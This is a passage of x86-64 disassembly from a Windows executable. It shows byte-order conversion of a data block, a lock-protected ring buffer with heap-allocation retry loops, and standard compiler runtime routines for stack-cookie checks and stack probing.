   1400095a6:	8b c2                	mov    %edx,%eax
   1400095a8:	c1 e8 18             	shr    $0x18,%eax
   1400095ab:	41 88 47 0c          	mov    %al,0xc(%r15)
   1400095af:	8b c2                	mov    %edx,%eax
   1400095b1:	c1 e8 10             	shr    $0x10,%eax
   1400095b4:	41 88 47 0d          	mov    %al,0xd(%r15)
   1400095b8:	8b c2                	mov    %edx,%eax
   1400095ba:	c1 e8 08             	shr    $0x8,%eax
   1400095bd:	41 88 47 0e          	mov    %al,0xe(%r15)
   1400095c1:	41 88 4f 0b          	mov    %cl,0xb(%r15)
   1400095c5:	41 88 57 0f          	mov    %dl,0xf(%r15)
   1400095c9:	8b 4b 10             	mov    0x10(%rbx),%ecx
   1400095cc:	8b c1                	mov    %ecx,%eax
   1400095ce:	8b 53 14             	mov    0x14(%rbx),%edx
   1400095d1:	c1 e8 18             	shr    $0x18,%eax
   1400095d4:	41 88 47 10          	mov    %al,0x10(%r15)
   1400095d8:	8b c1                	mov    %ecx,%eax
   1400095da:	c1 e8 10             	shr    $0x10,%eax
   1400095dd:	41 88 47 11          	mov    %al,0x11(%r15)
   1400095e1:	8b c1                	mov    %ecx,%eax
   1400095e3:	c1 e8 08             	shr    $0x8,%eax
   1400095e6:	41 88 47 12          	mov    %al,0x12(%r15)
   1400095ea:	8b c2                	mov    %edx,%eax
   1400095ec:	c1 e8 18             	shr    $0x18,%eax
   1400095ef:	41 88 47 14          	mov    %al,0x14(%r15)
   1400095f3:	8b c2                	mov    %edx,%eax
   1400095f5:	c1 e8 10             	shr    $0x10,%eax
   1400095f8:	41 88 47 15          	mov    %al,0x15(%r15)
   1400095fc:	8b c2                	mov    %edx,%eax
   1400095fe:	c1 e8 08             	shr    $0x8,%eax
   140009601:	41 88 47 16          	mov    %al,0x16(%r15)
   140009605:	41 88 4f 13          	mov    %cl,0x13(%r15)
   140009609:	41 88 57 17          	mov    %dl,0x17(%r15)
   14000960d:	8b 4b 18             	mov    0x18(%rbx),%ecx
   140009610:	8b c1                	mov    %ecx,%eax
   140009612:	8b 53 1c             	mov    0x1c(%rbx),%edx
   140009615:	c1 e8 18             	shr    $0x18,%eax
   140009618:	41 88 47 18          	mov    %al,0x18(%r15)
   14000961c:	8b c1                	mov    %ecx,%eax
   14000961e:	c1 e8 10             	shr    $0x10,%eax
   140009621:	41 88 47 19          	mov    %al,0x19(%r15)
   140009625:	8b c1                	mov    %ecx,%eax
   140009627:	c1 e8 08             	shr    $0x8,%eax
   14000962a:	41 88 47 1a          	mov    %al,0x1a(%r15)
   14000962e:	8b c2                	mov    %edx,%eax
   140009630:	c1 e8 18             	shr    $0x18,%eax
   140009633:	41 88 47 1c          	mov    %al,0x1c(%r15)
   140009637:	8b c2                	mov    %edx,%eax
   140009639:	c1 e8 10             	shr    $0x10,%eax
   14000963c:	41 88 47 1d          	mov    %al,0x1d(%r15)
   140009640:	8b c2                	mov    %edx,%eax
   140009642:	c1 e8 08             	shr    $0x8,%eax
   140009645:	41 88 47 1e          	mov    %al,0x1e(%r15)
   140009649:	41 88 4f 1b          	mov    %cl,0x1b(%r15)
   14000964d:	41 88 57 1f          	mov    %dl,0x1f(%r15)
   140009651:	8b 4b 20             	mov    0x20(%rbx),%ecx
   140009654:	8b c1                	mov    %ecx,%eax
   140009656:	8b 53 24             	mov    0x24(%rbx),%edx
   140009659:	c1 e8 18             	shr    $0x18,%eax
   14000965c:	41 88 47 20          	mov    %al,0x20(%r15)
   140009660:	8b c1                	mov    %ecx,%eax
   140009662:	c1 e8 10             	shr    $0x10,%eax
   140009665:	41 88 47 21          	mov    %al,0x21(%r15)
   140009669:	8b c1                	mov    %ecx,%eax
   14000966b:	c1 e8 08             	shr    $0x8,%eax
   14000966e:	41 88 47 22          	mov    %al,0x22(%r15)
   140009672:	8b c2                	mov    %edx,%eax
   140009674:	c1 e8 18             	shr    $0x18,%eax
   140009677:	41 88 47 24          	mov    %al,0x24(%r15)
   14000967b:	8b c2                	mov    %edx,%eax
   14000967d:	c1 e8 10             	shr    $0x10,%eax
   140009680:	41 88 47 25          	mov    %al,0x25(%r15)
   140009684:	8b c2                	mov    %edx,%eax
   140009686:	c1 e8 08             	shr    $0x8,%eax
   140009689:	41 88 47 26          	mov    %al,0x26(%r15)
   14000968d:	41 88 4f 23          	mov    %cl,0x23(%r15)
   140009691:	41 88 57 27          	mov    %dl,0x27(%r15)
   140009695:	8b 4b 28             	mov    0x28(%rbx),%ecx
   140009698:	8b c1                	mov    %ecx,%eax
   14000969a:	8b 53 2c             	mov    0x2c(%rbx),%edx
   14000969d:	c1 e8 18             	shr    $0x18,%eax
   1400096a0:	41 88 47 28          	mov    %al,0x28(%r15)
   1400096a4:	8b c1                	mov    %ecx,%eax
   1400096a6:	c1 e8 10             	shr    $0x10,%eax
   1400096a9:	41 88 47 29          	mov    %al,0x29(%r15)
   1400096ad:	8b c1                	mov    %ecx,%eax
   1400096af:	c1 e8 08             	shr    $0x8,%eax
   1400096b2:	41 88 47 2a          	mov    %al,0x2a(%r15)
   1400096b6:	8b c2                	mov    %edx,%eax
   1400096b8:	c1 e8 18             	shr    $0x18,%eax
   1400096bb:	41 88 47 2c          	mov    %al,0x2c(%r15)
   1400096bf:	41 88 4f 2b          	mov    %cl,0x2b(%r15)
   1400096c3:	41 88 57 2f          	mov    %dl,0x2f(%r15)
   1400096c7:	8b c2                	mov    %edx,%eax
   1400096c9:	c1 e8 10             	shr    $0x10,%eax
   1400096cc:	41 88 47 2d          	mov    %al,0x2d(%r15)
   1400096d0:	8b c2                	mov    %edx,%eax
   1400096d2:	c1 e8 08             	shr    $0x8,%eax
   1400096d5:	41 88 47 2e          	mov    %al,0x2e(%r15)
   1400096d9:	8b 4b 30             	mov    0x30(%rbx),%ecx
   1400096dc:	8b c1                	mov    %ecx,%eax
   1400096de:	8b 53 34             	mov    0x34(%rbx),%edx
   1400096e1:	c1 e8 18             	shr    $0x18,%eax
   1400096e4:	41 88 47 30          	mov    %al,0x30(%r15)
   1400096e8:	8b c1                	mov    %ecx,%eax
   1400096ea:	c1 e8 10             	shr    $0x10,%eax
   1400096ed:	41 88 47 31          	mov    %al,0x31(%r15)
   1400096f1:	8b c1                	mov    %ecx,%eax
   1400096f3:	c1 e8 08             	shr    $0x8,%eax
   1400096f6:	41 88 47 32          	mov    %al,0x32(%r15)
   1400096fa:	8b c2                	mov    %edx,%eax
   1400096fc:	c1 e8 18             	shr    $0x18,%eax
   1400096ff:	41 88 47 34          	mov    %al,0x34(%r15)
   140009703:	8b c2                	mov    %edx,%eax
   140009705:	c1 e8 10             	shr    $0x10,%eax
   140009708:	41 88 47 35          	mov    %al,0x35(%r15)
   14000970c:	8b c2                	mov    %edx,%eax
   14000970e:	c1 e8 08             	shr    $0x8,%eax
   140009711:	41 88 47 36          	mov    %al,0x36(%r15)
   140009715:	41 88 4f 33          	mov    %cl,0x33(%r15)
   140009719:	41 88 57 37          	mov    %dl,0x37(%r15)
   14000971d:	8b 4b 38             	mov    0x38(%rbx),%ecx
   140009720:	8b c1                	mov    %ecx,%eax
   140009722:	8b 53 3c             	mov    0x3c(%rbx),%edx
   140009725:	c1 e8 18             	shr    $0x18,%eax
   140009728:	41 88 47 38          	mov    %al,0x38(%r15)
   14000972c:	8b c1                	mov    %ecx,%eax
   14000972e:	c1 e8 10             	shr    $0x10,%eax
   140009731:	41 88 47 39          	mov    %al,0x39(%r15)
   140009735:	8b c1                	mov    %ecx,%eax
   140009737:	c1 e8 08             	shr    $0x8,%eax
   14000973a:	41 88 47 3a          	mov    %al,0x3a(%r15)
   14000973e:	8b c2                	mov    %edx,%eax
   140009740:	c1 e8 18             	shr    $0x18,%eax
   140009743:	41 88 47 3c          	mov    %al,0x3c(%r15)
   140009747:	8b c2                	mov    %edx,%eax
   140009749:	c1 e8 10             	shr    $0x10,%eax
   14000974c:	41 88 47 3d          	mov    %al,0x3d(%r15)
   140009750:	8b c2                	mov    %edx,%eax
   140009752:	c1 e8 08             	shr    $0x8,%eax
   140009755:	41 88 47 3e          	mov    %al,0x3e(%r15)
   140009759:	41 88 4f 3b          	mov    %cl,0x3b(%r15)
   14000975d:	41 88 57 3f          	mov    %dl,0x3f(%r15)
   140009761:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   140009765:	48 33 cc             	xor    %rsp,%rcx
   140009768:	e8 73 02 00 00       	call   0x1400099e0
   14000976d:	4c 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%r11
   140009774:	00 
   140009775:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   140009779:	49 8b 73 48          	mov    0x48(%r11),%rsi
   14000977d:	49 8b e3             	mov    %r11,%rsp
   140009780:	41 5f                	pop    %r15
   140009782:	41 5e                	pop    %r14
   140009784:	41 5c                	pop    %r12
   140009786:	5f                   	pop    %rdi
   140009787:	5d                   	pop    %rbp
   140009788:	c3                   	ret
   140009789:	cc                   	int3
   14000978a:	cc                   	int3
   14000978b:	cc                   	int3
   14000978c:	cc                   	int3
   14000978d:	cc                   	int3
   14000978e:	cc                   	int3
   14000978f:	cc                   	int3
   140009790:	4c 8b c1             	mov    %rcx,%r8
   140009793:	33 d2                	xor    %edx,%edx
   140009795:	48 8b 0d 64 1e 00 00 	mov    0x1e64(%rip),%rcx        # 0x14000b600
   14000979c:	48 ff 25 3d 39 00 00 	rex.W jmp *0x393d(%rip)        # 0x14000d0e0
   1400097a3:	cc                   	int3
   1400097a4:	cc                   	int3
   1400097a5:	cc                   	int3
   1400097a6:	cc                   	int3
   1400097a7:	cc                   	int3
   1400097a8:	cc                   	int3
   1400097a9:	cc                   	int3
   1400097aa:	cc                   	int3
   1400097ab:	cc                   	int3
   1400097ac:	cc                   	int3
   1400097ad:	cc                   	int3
   1400097ae:	cc                   	int3
   1400097af:	cc                   	int3
   1400097b0:	40 53                	rex push %rbx
   1400097b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400097b6:	48 8d 59 40          	lea    0x40(%rcx),%rbx
   1400097ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400097c0:	48 8b 0d 39 1e 00 00 	mov    0x1e39(%rip),%rcx        # 0x14000b600
   1400097c7:	4c 8b c3             	mov    %rbx,%r8
   1400097ca:	ba 08 00 00 00       	mov    $0x8,%edx
   1400097cf:	ff 15 13 39 00 00    	call   *0x3913(%rip)        # 0x14000d0e8
   1400097d5:	48 85 c0             	test   %rax,%rax
   1400097d8:	74 e6                	je     0x1400097c0
   1400097da:	48 83 c4 20          	add    $0x20,%rsp
   1400097de:	5b                   	pop    %rbx
   1400097df:	c3                   	ret
   1400097e0:	40 53                	rex push %rbx
   1400097e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400097e6:	48 63 c1             	movslq %ecx,%rax
   1400097e9:	89 0d 45 1e 00 00    	mov    %ecx,0x1e45(%rip)        # 0x14000b634
   1400097ef:	48 8d 1c c5 40 00 00 	lea    0x40(,%rax,8),%rbx
   1400097f6:	00 
   1400097f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400097fe:	00 00 
   140009800:	48 8b 0d f9 1d 00 00 	mov    0x1df9(%rip),%rcx        # 0x14000b600
   140009807:	4c 8b c3             	mov    %rbx,%r8
   14000980a:	ba 08 00 00 00       	mov    $0x8,%edx
   14000980f:	ff 15 d3 38 00 00    	call   *0x38d3(%rip)        # 0x14000d0e8
   140009815:	48 85 c0             	test   %rax,%rax
   140009818:	74 e6                	je     0x140009800
   14000981a:	8b 15 14 1e 00 00    	mov    0x1e14(%rip),%edx        # 0x14000b634
   140009820:	45 33 c9             	xor    %r9d,%r9d
   140009823:	44 8b c2             	mov    %edx,%r8d
   140009826:	48 89 05 13 1e 00 00 	mov    %rax,0x1e13(%rip)        # 0x14000b640
   14000982d:	33 c9                	xor    %ecx,%ecx
   14000982f:	ff 15 eb 38 00 00    	call   *0x38eb(%rip)        # 0x14000d120
   140009835:	44 8b 05 f8 1d 00 00 	mov    0x1df8(%rip),%r8d        # 0x14000b634
   14000983c:	45 33 c9             	xor    %r9d,%r9d
   14000983f:	33 d2                	xor    %edx,%edx
   140009841:	48 89 05 00 1e 00 00 	mov    %rax,0x1e00(%rip)        # 0x14000b648
   140009848:	33 c9                	xor    %ecx,%ecx
   14000984a:	ff 15 d0 38 00 00    	call   *0x38d0(%rip)        # 0x14000d120
   140009850:	48 8d 0d b1 1d 00 00 	lea    0x1db1(%rip),%rcx        # 0x14000b608
   140009857:	48 89 05 da 1d 00 00 	mov    %rax,0x1dda(%rip)        # 0x14000b638
   14000985e:	48 83 c4 20          	add    $0x20,%rsp
   140009862:	5b                   	pop    %rbx
   140009863:	48 ff 25 a6 38 00 00 	rex.W jmp *0x38a6(%rip)        # 0x14000d110
   14000986a:	cc                   	int3
   14000986b:	cc                   	int3
   14000986c:	cc                   	int3
   14000986d:	cc                   	int3
   14000986e:	cc                   	int3
   14000986f:	cc                   	int3
   140009870:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009875:	56                   	push   %rsi
   140009876:	48 83 ec 20          	sub    $0x20,%rsp
   14000987a:	33 db                	xor    %ebx,%ebx
   14000987c:	48 8b f1             	mov    %rcx,%rsi
   14000987f:	48 85 c9             	test   %rcx,%rcx
   140009882:	74 4f                	je     0x1400098d3
   140009884:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140009889:	ff 15 a1 37 00 00    	call   *0x37a1(%rip)        # 0x14000d030
   14000988f:	ff c0                	inc    %eax
   140009891:	48 63 f8             	movslq %eax,%rdi
   140009894:	0f 1f 40 00          	nopl   0x0(%rax)
   140009898:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000989f:	00 
   1400098a0:	48 8b 0d 59 1d 00 00 	mov    0x1d59(%rip),%rcx        # 0x14000b600
   1400098a7:	4c 8d 04 fd 40 00 00 	lea    0x40(,%rdi,8),%r8
   1400098ae:	00 
   1400098af:	ba 08 00 00 00       	mov    $0x8,%edx
   1400098b4:	ff 15 2e 38 00 00    	call   *0x382e(%rip)        # 0x14000d0e8
   1400098ba:	48 8b d8             	mov    %rax,%rbx
   1400098bd:	48 85 c0             	test   %rax,%rax
   1400098c0:	74 de                	je     0x1400098a0
   1400098c2:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400098c7:	48 8b d6             	mov    %rsi,%rdx
   1400098ca:	48 8b c8             	mov    %rax,%rcx
   1400098cd:	ff 15 ed 37 00 00    	call   *0x37ed(%rip)        # 0x14000d0c0
   1400098d3:	48 8b 0d 6e 1d 00 00 	mov    0x1d6e(%rip),%rcx        # 0x14000b648
   1400098da:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400098df:	ff 15 33 38 00 00    	call   *0x3833(%rip)        # 0x14000d118
   1400098e5:	48 8d 0d 1c 1d 00 00 	lea    0x1d1c(%rip),%rcx        # 0x14000b608
   1400098ec:	ff 15 06 38 00 00    	call   *0x3806(%rip)        # 0x14000d0f8
   1400098f2:	4c 63 05 37 1d 00 00 	movslq 0x1d37(%rip),%r8        # 0x14000b630
   1400098f9:	48 8d 0d 08 1d 00 00 	lea    0x1d08(%rip),%rcx        # 0x14000b608
   140009900:	48 8b 05 39 1d 00 00 	mov    0x1d39(%rip),%rax        # 0x14000b640
   140009907:	4a 89 1c c0          	mov    %rbx,(%rax,%r8,8)
   14000990b:	41 8d 40 01          	lea    0x1(%r8),%eax
   14000990f:	99                   	cltd
   140009910:	f7 3d 1e 1d 00 00    	idivl  0x1d1e(%rip)        # 0x14000b634
   140009916:	89 15 14 1d 00 00    	mov    %edx,0x1d14(%rip)        # 0x14000b630
   14000991c:	ff 15 e6 37 00 00    	call   *0x37e6(%rip)        # 0x14000d108
   140009922:	48 8b 0d 0f 1d 00 00 	mov    0x1d0f(%rip),%rcx        # 0x14000b638
   140009929:	45 33 c0             	xor    %r8d,%r8d
   14000992c:	ba 01 00 00 00       	mov    $0x1,%edx
   140009931:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140009936:	48 83 c4 20          	add    $0x20,%rsp
   14000993a:	5e                   	pop    %rsi
   14000993b:	48 ff 25 be 37 00 00 	rex.W jmp *0x37be(%rip)        # 0x14000d100
   140009942:	cc                   	int3
   140009943:	cc                   	int3
   140009944:	cc                   	int3
   140009945:	cc                   	int3
   140009946:	cc                   	int3
   140009947:	cc                   	int3
   140009948:	cc                   	int3
   140009949:	cc                   	int3
   14000994a:	cc                   	int3
   14000994b:	cc                   	int3
   14000994c:	cc                   	int3
   14000994d:	cc                   	int3
   14000994e:	cc                   	int3
   14000994f:	cc                   	int3
   140009950:	40 53                	rex push %rbx
   140009952:	48 83 ec 20          	sub    $0x20,%rsp
   140009956:	48 8b 0d db 1c 00 00 	mov    0x1cdb(%rip),%rcx        # 0x14000b638
   14000995d:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140009962:	ff 15 b0 37 00 00    	call   *0x37b0(%rip)        # 0x14000d118
   140009968:	48 8d 0d 99 1c 00 00 	lea    0x1c99(%rip),%rcx        # 0x14000b608
   14000996f:	ff 15 83 37 00 00    	call   *0x3783(%rip)        # 0x14000d0f8
   140009975:	4c 63 05 d4 1c 00 00 	movslq 0x1cd4(%rip),%r8        # 0x14000b650
   14000997c:	48 8d 0d 85 1c 00 00 	lea    0x1c85(%rip),%rcx        # 0x14000b608
   140009983:	48 8b 05 b6 1c 00 00 	mov    0x1cb6(%rip),%rax        # 0x14000b640
   14000998a:	4a 8b 1c c0          	mov    (%rax,%r8,8),%rbx
   14000998e:	41 8d 40 01          	lea    0x1(%r8),%eax
   140009992:	99                   	cltd
   140009993:	f7 3d 9b 1c 00 00    	idivl  0x1c9b(%rip)        # 0x14000b634
   140009999:	89 15 b1 1c 00 00    	mov    %edx,0x1cb1(%rip)        # 0x14000b650
   14000999f:	ff 15 63 37 00 00    	call   *0x3763(%rip)        # 0x14000d108
   1400099a5:	48 8b 0d 9c 1c 00 00 	mov    0x1c9c(%rip),%rcx        # 0x14000b648
   1400099ac:	45 33 c0             	xor    %r8d,%r8d
   1400099af:	ba 01 00 00 00       	mov    $0x1,%edx
   1400099b4:	ff 15 46 37 00 00    	call   *0x3746(%rip)        # 0x14000d100
   1400099ba:	48 8b c3             	mov    %rbx,%rax
   1400099bd:	48 83 c4 20          	add    $0x20,%rsp
   1400099c1:	5b                   	pop    %rbx
   1400099c2:	c3                   	ret
   1400099c3:	cc                   	int3
   1400099c4:	cc                   	int3
   1400099c5:	cc                   	int3
   1400099c6:	cc                   	int3
   1400099c7:	cc                   	int3
   1400099c8:	cc                   	int3
   1400099c9:	cc                   	int3
   1400099ca:	cc                   	int3
   1400099cb:	cc                   	int3
   1400099cc:	cc                   	int3
   1400099cd:	cc                   	int3
   1400099ce:	cc                   	int3
   1400099cf:	cc                   	int3
   1400099d0:	cc                   	int3
   1400099d1:	cc                   	int3
   1400099d2:	cc                   	int3
   1400099d3:	cc                   	int3
   1400099d4:	cc                   	int3
   1400099d5:	cc                   	int3
   1400099d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400099dd:	00 00 00 
   1400099e0:	48 3b 0d 19 16 00 00 	cmp    0x1619(%rip),%rcx        # 0x14000b000
   1400099e7:	75 10                	jne    0x1400099f9
   1400099e9:	48 c1 c1 10          	rol    $0x10,%rcx
   1400099ed:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1400099f2:	75 01                	jne    0x1400099f5
   1400099f4:	c3                   	ret
   1400099f5:	48 c1 c9 10          	ror    $0x10,%rcx
   1400099f9:	e9 36 00 00 00       	jmp    0x140009a34
   1400099fe:	cc                   	int3
   1400099ff:	cc                   	int3
   140009a00:	40 53                	rex push %rbx
   140009a02:	48 83 ec 20          	sub    $0x20,%rsp
   140009a06:	48 8b d9             	mov    %rcx,%rbx
   140009a09:	33 c9                	xor    %ecx,%ecx
   140009a0b:	ff 15 27 37 00 00    	call   *0x3727(%rip)        # 0x14000d138
   140009a11:	48 8b cb             	mov    %rbx,%rcx
   140009a14:	ff 15 26 37 00 00    	call   *0x3726(%rip)        # 0x14000d140
   140009a1a:	ff 15 10 37 00 00    	call   *0x3710(%rip)        # 0x14000d130
   140009a20:	48 8b c8             	mov    %rax,%rcx
   140009a23:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140009a28:	48 83 c4 20          	add    $0x20,%rsp
   140009a2c:	5b                   	pop    %rbx
   140009a2d:	48 ff 25 f4 36 00 00 	rex.W jmp *0x36f4(%rip)        # 0x14000d128
   140009a34:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140009a39:	48 83 ec 38          	sub    $0x38,%rsp
   140009a3d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140009a42:	ff 15 18 37 00 00    	call   *0x3718(%rip)        # 0x14000d160
   140009a48:	85 c0                	test   %eax,%eax
   140009a4a:	74 07                	je     0x140009a53
   140009a4c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140009a51:	cd 29                	int    $0x29
   140009a53:	48 8d 0d d6 16 00 00 	lea    0x16d6(%rip),%rcx        # 0x14000b130
   140009a5a:	e8 a9 00 00 00       	call   0x140009b08
   140009a5f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140009a64:	48 89 05 bd 17 00 00 	mov    %rax,0x17bd(%rip)        # 0x14000b228
   140009a6b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140009a70:	48 83 c0 08          	add    $0x8,%rax
   140009a74:	48 89 05 4d 17 00 00 	mov    %rax,0x174d(%rip)        # 0x14000b1c8
   140009a7b:	48 8b 05 a6 17 00 00 	mov    0x17a6(%rip),%rax        # 0x14000b228
   140009a82:	48 89 05 17 16 00 00 	mov    %rax,0x1617(%rip)        # 0x14000b0a0
   140009a89:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009a8e:	48 89 05 1b 17 00 00 	mov    %rax,0x171b(%rip)        # 0x14000b1b0
   140009a95:	c7 05 f1 15 00 00 09 	movl   $0xc0000409,0x15f1(%rip)        # 0x14000b090
   140009a9c:	04 00 c0 
   140009a9f:	c7 05 eb 15 00 00 01 	movl   $0x1,0x15eb(%rip)        # 0x14000b094
   140009aa6:	00 00 00 
   140009aa9:	c7 05 f5 15 00 00 01 	movl   $0x1,0x15f5(%rip)        # 0x14000b0a8
   140009ab0:	00 00 00 
   140009ab3:	b8 08 00 00 00       	mov    $0x8,%eax
   140009ab8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140009abc:	48 8d 0d ed 15 00 00 	lea    0x15ed(%rip),%rcx        # 0x14000b0b0
   140009ac3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140009aca:	00 
   140009acb:	b8 08 00 00 00       	mov    $0x8,%eax
   140009ad0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140009ad4:	48 8b 0d 25 15 00 00 	mov    0x1525(%rip),%rcx        # 0x14000b000
   140009adb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140009ae0:	b8 08 00 00 00       	mov    $0x8,%eax
   140009ae5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140009ae9:	48 8b 0d 50 15 00 00 	mov    0x1550(%rip),%rcx        # 0x14000b040
   140009af0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140009af5:	48 8d 0d 04 75 ff ff 	lea    -0x8afc(%rip),%rcx        # 0x140001000
   140009afc:	e8 ff fe ff ff       	call   0x140009a00
   140009b01:	90                   	nop
   140009b02:	48 83 c4 38          	add    $0x38,%rsp
   140009b06:	c3                   	ret
   140009b07:	cc                   	int3
   140009b08:	40 53                	rex push %rbx
   140009b0a:	56                   	push   %rsi
   140009b0b:	57                   	push   %rdi
   140009b0c:	48 83 ec 40          	sub    $0x40,%rsp
   140009b10:	48 8b d9             	mov    %rcx,%rbx
   140009b13:	ff 15 3f 36 00 00    	call   *0x363f(%rip)        # 0x14000d158
   140009b19:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140009b20:	33 ff                	xor    %edi,%edi
   140009b22:	45 33 c0             	xor    %r8d,%r8d
   140009b25:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140009b2a:	48 8b ce             	mov    %rsi,%rcx
   140009b2d:	ff 15 1d 36 00 00    	call   *0x361d(%rip)        # 0x14000d150
   140009b33:	48 85 c0             	test   %rax,%rax
   140009b36:	74 39                	je     0x140009b71
   140009b38:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009b3e:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140009b43:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140009b48:	4c 8b c8             	mov    %rax,%r9
   140009b4b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009b50:	4c 8b c6             	mov    %rsi,%r8
   140009b53:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140009b58:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140009b5d:	33 c9                	xor    %ecx,%ecx
   140009b5f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009b64:	ff 15 de 35 00 00    	call   *0x35de(%rip)        # 0x14000d148
   140009b6a:	ff c7                	inc    %edi
   140009b6c:	83 ff 02             	cmp    $0x2,%edi
   140009b6f:	7c b1                	jl     0x140009b22
   140009b71:	48 83 c4 40          	add    $0x40,%rsp
   140009b75:	5f                   	pop    %rdi
   140009b76:	5e                   	pop    %rsi
   140009b77:	5b                   	pop    %rbx
   140009b78:	c3                   	ret
   140009b79:	cc                   	int3
   140009b7a:	cc                   	int3
   140009b7b:	cc                   	int3
   140009b7c:	48 83 ec 28          	sub    $0x28,%rsp
   140009b80:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140009b84:	48 8b ca             	mov    %rdx,%rcx
   140009b87:	49 8b d1             	mov    %r9,%rdx
   140009b8a:	e8 0d 00 00 00       	call   0x140009b9c
   140009b8f:	b8 01 00 00 00       	mov    $0x1,%eax
   140009b94:	48 83 c4 28          	add    $0x28,%rsp
   140009b98:	c3                   	ret
   140009b99:	cc                   	int3
   140009b9a:	cc                   	int3
   140009b9b:	cc                   	int3
   140009b9c:	40 53                	rex push %rbx
   140009b9e:	45 8b 18             	mov    (%r8),%r11d
   140009ba1:	48 8b da             	mov    %rdx,%rbx
   140009ba4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140009ba8:	4c 8b c9             	mov    %rcx,%r9
   140009bab:	41 f6 00 04          	testb  $0x4,(%r8)
   140009baf:	4c 8b d1             	mov    %rcx,%r10
   140009bb2:	74 13                	je     0x140009bc7
   140009bb4:	41 8b 40 08          	mov    0x8(%r8),%eax
   140009bb8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140009bbc:	f7 d8                	neg    %eax
   140009bbe:	4c 03 d1             	add    %rcx,%r10
   140009bc1:	48 63 c8             	movslq %eax,%rcx
   140009bc4:	4c 23 d1             	and    %rcx,%r10
   140009bc7:	49 63 c3             	movslq %r11d,%rax
   140009bca:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140009bce:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140009bd2:	8b 48 08             	mov    0x8(%rax),%ecx
   140009bd5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140009bd9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140009bde:	74 0b                	je     0x140009beb
   140009be0:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140009be5:	83 e0 f0             	and    $0xfffffff0,%eax
   140009be8:	4c 03 c8             	add    %rax,%r9
   140009beb:	4c 33 ca             	xor    %rdx,%r9
   140009bee:	49 8b c9             	mov    %r9,%rcx
   140009bf1:	5b                   	pop    %rbx
   140009bf2:	e9 e9 fd ff ff       	jmp    0x1400099e0
   140009bf7:	cc                   	int3
   140009bf8:	cc                   	int3
   140009bf9:	cc                   	int3
   140009bfa:	cc                   	int3
   140009bfb:	cc                   	int3
   140009bfc:	cc                   	int3
   140009bfd:	cc                   	int3
   140009bfe:	cc                   	int3
   140009bff:	cc                   	int3
   140009c00:	cc                   	int3
   140009c01:	cc                   	int3
   140009c02:	cc                   	int3
   140009c03:	cc                   	int3
   140009c04:	cc                   	int3
   140009c05:	cc                   	int3
   140009c06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009c0d:	00 00 00 
   140009c10:	48 83 ec 10          	sub    $0x10,%rsp
   140009c14:	4c 89 14 24          	mov    %r10,(%rsp)
   140009c18:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   140009c1d:	4d 33 db             	xor    %r11,%r11
   140009c20:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140009c25:	4c 2b d0             	sub    %rax,%r10
   140009c28:	4d 0f 42 d3          	cmovb  %r11,%r10
   140009c2c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140009c33:	00 00 
   140009c35:	4d 3b d3             	cmp    %r11,%r10
   140009c38:	73 16                	jae    0x140009c50
   140009c3a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140009c40:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140009c47:	41 c6 03 00          	movb   $0x0,(%r11)
   140009c4b:	4d 3b d3             	cmp    %r11,%r10
   140009c4e:	75 f0                	jne    0x140009c40
   140009c50:	4c 8b 14 24          	mov    (%rsp),%r10
   140009c54:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140009c59:	48 83 c4 10          	add    $0x10,%rsp
   140009c5d:	c3                   	ret
   140009c5e:	cc                   	int3
   140009c5f:	cc                   	int3
